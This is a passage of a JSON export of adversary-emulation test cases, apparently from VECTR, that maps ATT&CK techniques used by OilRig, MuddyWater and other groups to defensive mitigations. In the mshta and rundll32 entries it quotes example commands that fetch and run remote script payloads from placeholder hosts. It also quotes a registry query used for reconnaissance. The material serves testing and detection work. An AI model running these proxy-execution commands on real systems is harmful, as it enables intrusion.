binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)\n---\n[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, penetration testing tool which bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system. (Citation: cobaltstrike manual)\n\nIn addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002). (Citation: cobaltstrike manual)\n---\n[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n","command":"[CopyKittens](https://attack.mitre.org/groups/G0052) has used PowerShell Empire.When PowerShell is necessary, restrict PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration. \n---\nSet PowerShell execution policy to execute only signed scripts. \n---\nIt may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions.\n\nDisable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.\n---\n[Cobalt Strike](https://attack.mitre.org/software/S0154) can execute a payload on a remote host with PowerShell. This technique does not write any data to disk.\n---\n[Empire](https://attack.mitre.org/software/S0363) leverages PowerShell for the majority of its client-side agent tasks. [Empire](https://attack.mitre.org/software/S0363) also contains the ability to conduct PowerShell remoting with the <code>Invoke-PSRemoting</code> module.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["9d8e81e7-127f-464e-8671-bfdc6cced3d5","76ca4ddf-5174-57a7-2842-70d5af62a25c"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--f4882e23-8aa7-4b12-b28a-b349c12ee9e0","relationship--2f68f61d-07e1-4181-a26c-93433f9f0db7","relationship--b188b994-7965-4c34-81d6-307f218ba80e","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--79568b8a-09c2-40fa-acd9-c7d369059b6a","course-of-action--590777b3-b475-4c7c-aaf8-f4a73b140312","relationship--39962764-cf46-4f39-9dd9-95b0ced56d93","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--1f8f6283-6004-4204-a54f-759e9c0519b1","course-of-action--d0415180-51e9-40ce-b57c-c332b0b441f2","tool--aafea02e-ece5-4bb2-91a6-3bf8c7f38a39","relationship--1b51b49a-1f3a-4b5d-aea3-989e9ccb72ad","tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3","relationship--095d2af9-dca4-4a7a-b22e-e37923e7c43c","intrusion-set--dcd81c6e-ebf7-4a16-93e0-9a97fa49c88a"]}],"references":["(Citation: Github PowerShell Empire)","Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019. https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/","Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018. https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/","ClearSky Cyber Security and Trend Micro. (2017, July). Operation Wilted Tulip: Exposing a cyber espionage apparatus. Retrieved August 21, 2017. http://www.clearskysec.com/wp-content/uploads/2017/07/Operation_Wilted_Tulip.pdf","Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016. https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html","Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016. https://github.com/jaredhaight/PSAttack","Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016. http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf","Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016. https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. https://github.com/PowerShellEmpire/Empire","Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019. https://github.com/dstepanic/attck_empire","Strategic Cyber LLC. (2017, March 14). Cobalt Strike Manual. Retrieved May 24, 2017. https://cobaltstrike.com/downloads/csmanual38.pdf","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf","Warner, J.. (2015, January 6). Inexorable PowerShell – A Red Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018. http://www.sixdub.net/?p=367"],"mitreId":"T1086"},"blueTeam":{"successfulDetectionBehaviors":["Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration. (Citation: Netspi PowerShell Execution Policy Bypass) Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--45034000-9d34-412f-8dec-4a84c13f922f","vectrId":"45034000-9d34-412f-8dec-4a84c13f922f","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"45034000-9d34-412f-8dec-4a84c13f922f","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Remote File Copy","variant":"OilRig - Remote File Copy - certutil","objective":"Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as [FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\n\nAdversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076).\n---\n[certutil](https://attack.mitre.org/software/S0160) is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services. (Citation: TechNet Certutil)","command":"[OilRig](https://attack.mitre.org/groups/G0049) can download remote files onto victims.Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.\n---\n[certutil](https://attack.mitre.org/software/S0160) can be used to download files from a given URL.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["2b8ddd46-e0f0-4db7-bf0d-ba1854dbea36"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add","relationship--8e9f95f0-4939-4e74-9073-70efddddff50","relationship--1ddae833-8280-4afa-b2b0-e250e22104fe","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--ab637576-5bf9-423f-b5e8-6d1ac26bbb5c","course-of-action--cdecc44a-1dbf-4c1f-881c-f21e3f47272a","tool--0a68f1f1-da74-4d28-8d9a-696c082706cc","relationship--73f5c564-53b1-48bc-8cab-32fa4a608672","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","LOLBAS. (n.d.). Certutil.exe. Retrieved July 31, 2019. https://lolbas-project.github.io/lolbas/Binaries/Certutil/","Microsoft. (2012, November 14). Certutil. Retrieved July 3, 2017. https://technet.microsoft.com/library/cc732443.aspx","Sardiwal, M, et al. (2017, December 7). New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit. Retrieved December 20, 2017. https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html"],"mitreId":"T1105"},"blueTeam":{"successfulDetectionBehaviors":["Use intrusion detection signatures to block traffic at network boundaries.","Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--4526f1ed-fcf3-465d-8107-17579a737c6b","vectrId":"4526f1ed-fcf3-465d-8107-17579a737c6b","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"4526f1ed-fcf3-465d-8107-17579a737c6b","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Query Registry","variant":"OilRig - Query Registry - Reg","objective":"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. (Citation: Wikipedia Windows Registry) Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n---\n[Reg](https://attack.mitre.org/software/S0075) is a Windows utility used to interact with the Windows Registry. It can be used at the command-line interface to query, add, modify, and remove information. (Citation: Microsoft Reg)\n\nUtilities such as [Reg](https://attack.mitre.org/software/S0075) are known to be used by persistent threats. (Citation: Windows Commands JPCERT)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used <code>reg query “HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default”</code> on a victim to query the Registry.[Reg](https://attack.mitre.org/software/S0075) may be used to gather details from the Windows Registry of a local or remote system at the command-line interface.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["513d0a31-4d49-4006-8591-c5b67477faf6"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896","relationship--e30c24d3-d440-4395-88b3-3192a02c4364","relationship--b003a96b-81f7-436c-99a6-a25323f759ac","course-of-action--0640214c-95af-4c04-a574-2a1ba6dda00b","tool--cde2d700-9ed1-46cf-9bce-07364fe8b24f","relationship--5365d764-76fa-49ce-b76b-d0344322b037","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Falcone, R. and Lee, B.. (2016, May 26). The OilRig Campaign: Attacks on Saudi Arabian Organizations Deliver Helminth Backdoor. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/","Microsoft. (2012, April 17). Reg. Retrieved May 1, 2015. https://technet.microsoft.com/en-us/library/cc732643.aspx","Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016. http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html","Wikipedia. (n.d.). Windows Registry. Retrieved February 2, 2015. https://en.wikipedia.org/wiki/Windows_Registry"],"mitreId":"T1012"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--458b4bad-c81c-4b94-98a9-5dbfb752f486","vectrId":"458b4bad-c81c-4b94-98a9-5dbfb752f486","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"458b4bad-c81c-4b94-98a9-5dbfb752f486","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Mshta","variant":"MuddyWater - Mshta","objective":"Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nAdversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used mshta.exe to execute its [POWERSTATS](https://attack.mitre.org/software/S0223) payload and to pass a PowerShell one-liner for execution.Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life.\n---\nUse application whitelisting configured to block execution of mshta.exe if it is not required for a given system or network to prevent potential misuse by adversaries.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--a127c32c-cbb0-4f9d-be07-881a792408ec","relationship--1923bc58-a830-457d-810f-27091e032f46","relationship--2e3b8b06-5148-4313-8b1b-d75789838c84","course-of-action--d2dce10b-3562-4d61-b2f5-7c6384b038e2","relationship--b5bb955f-cf1c-4398-9766-d06b30dfe326","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--0672855a-d701-45fc-ba05-872561b46086","course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017. https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html","Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017. https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html","Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017. https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/","Gross, J. (2016, February 23). Operation Dust Storm. Retrieved September 19, 2017. https://www.cylance.com/content/dam/cylance/pdfs/reports/Op_Dust_Storm_Report.pdf","Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/","LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019. https://lolbas-project.github.io/lolbas/Binaries/Mshta/","McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017. https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/","Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017. https://msdn.microsoft.com/library/ms536471.aspx","Singh, S. et al.. (2018, March 13). Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign. Retrieved April 11, 2018. https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html","Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017. https://en.wikipedia.org/wiki/HTML_Application"],"mitreId":"T1170"},"blueTeam":{"successfulDetectionBehaviors":["Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life. Use application whitelisting configured to block execution of mshta.exe if it is not required for a given system or network to prevent potential misuse by adversaries.","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","Block execution of code on a system through application whitelisting, blacklisting, and/or script blocking."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--47a87b6f-da68-4bdb-bb76-770ab510721b","vectrId":"47a87b6f-da68-4bdb-bb76-770ab510721b","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"47a87b6f-da68-4bdb-bb76-770ab510721b","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Rundll32","variant":"MuddyWater - Rundll32","objective":"The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5","relationship--ea11624f-1025-46a9-820b-0b87866f534d","relationship--aba9ea33-32fb-4fb6-a7af-3d8902596fc8","course-of-action--d2a24649-9694-4c97-9c62-ce7b270bf6a3","relationship--98c18956-03d7-49e5-93b2-44351682331d","course-of-action--8c918d8a-11c5-4ffd-af10-e74bc06bdfae","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018. https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/","Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/","Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017. https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf"],"mitreId":"T1085"},"blueTeam":{"successfulDetectionBehaviors":["Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.","Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting. (Citation: Secure Host Baseline EMET)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--4821ba7e-77b9-44de-9742-207e5824b6cd","vectrId":"4821ba7e-77b9-44de-9742-207e5824b6cd","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"4821ba7e-77b9-44de-9742-207e5824b6cd","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"File Deletion","variant":"OilRig - File Deletion","objective":"Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)","command":"[OilRig](https://attack.mitre.org/groups/G0049) has deleted files associated with their payload after execution.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--56fca983-1cf1-4fd1-bda0-5e170a37ab59","relationship--51f1d23c-1ccd-4cc4-918c-39e9a66e510b","relationship--8ff745b7-9985-4781-a8bc-dae6d71233d3","course-of-action--34efb2fd-4dc2-40d4-a564-0c147c85034d","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Lee, B., Falcone, R. (2018, February 23). OopsIE! OilRig Uses ThreeDollars to Deliver New Trojan. Retrieved July 16, 2018. https://researchcenter.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/","Sardiwal, M, et al. (2017, December 7). New Targeted Attack in the Middle East by APT34, a Suspected Iranian Threat Group, Using CVE-2017-11882 Exploit. Retrieved December 20, 2017. https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html","Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015. http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/"],"mitreId":"T1107"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--4b442c7d-ee1f-494d-9339-3ed8fb9c7425","vectrId":"4b442c7d-ee1f-494d-9339-3ed8fb9c7425","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"4b442c7d-ee1f-494d-9339-3ed8fb9c7425","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"System Network Configuration Discovery","variant":"Magic Hound - System Network Configuration Discovery - Pupy","objective":"Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) malware gathers the victim's local IP address, MAC address, and external IP address.[Pupy](https://attack.mitre.org/software/S0192) has built in commands to identify a host’s IP address and find out other network configuration settings by viewing connected 